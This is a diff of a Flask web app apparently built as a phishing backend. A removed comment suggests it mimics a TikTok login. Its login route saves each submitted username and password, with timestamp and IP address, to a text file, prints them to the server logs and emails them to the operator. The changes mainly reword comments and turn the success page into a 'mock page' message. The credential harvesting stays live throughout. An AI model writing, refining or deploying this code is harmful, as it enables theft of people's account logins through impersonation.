@@ -3,7 +3,7 @@
 from flask import Flask, render_template, request, redirect, url_for
 import smtplib
 from email.mime.text import MIMEText
-import os # ESSENTIAL for Render's PORT environment variable
+import os # This import is essential for Render's PORT environment variable
 from datetime import datetime # For adding timestamps to logs
 
 app = Flask(__name__)
@@ -39,9 +39,9 @@ def login():
         ip_address = request.environ.get('REMOTE_ADDR', 'Unknown IP') # Get client IP
         with open("credentials.txt", "a") as f:
             f.write(f"[{timestamp}] IP: {ip_address} - User: {username} | Pass: {password}\n")
-        print(f"Credentials saved to credentials.txt: {username} | {password}") # THIS MUST APPEAR IN LOGS
+        print(f"Credentials saved to credentials.txt: {username} | {password}") # This print is important
     except Exception as e:
-        print(f"Error saving credentials to file: {e}") # THIS MUST APPEAR IN LOGS IF FILE SAVE FAILS
+        print(f"Error saving credentials to file: {e}") # This print is important if an error occurs
     # --- End Credential Logging ---
 
     # --- Email Notification ---
@@ -59,19 +59,19 @@ def login():
             msg['To'] = TO_EMAIL
 
             smtp.send_message(msg)
-            print("Credentials sent via email successfully!") # THIS MUST APPEAR IN LOGS ON SUCCESS
+            print("Credentials sent via email successfully!") # This print is important
 
     except Exception as e:
         # If an error occurs during email sending, this will be printed in Render logs
-        print(f"Error sending email: {e}") # THIS MUST APPEAR IN LOGS IF EMAIL SENDING FAILS
+        print(f"Error sending email: {e}") # This print is important if an error occurs
 
-    # --- Redirect to a page that shows message then auto-redirects to TikTok ---
+    # This redirects to the "mock page" you had before
     return redirect(url_for('success'))
 
-# --- NEW/MODIFIED ROUTE: The success route that renders success.html ---
+# The success route that shows the mock page (your original behavior)
 @app.route("/success")
 def success():
-    return render_template("success.html")
+    return "Login successful! (This is a mock page)"
 
 # --- CRITICAL FOR RENDER DEPLOYMENT ---
 # Your Flask app MUST bind to 0.0.0.0 and use the dynamic PORT provided by Render
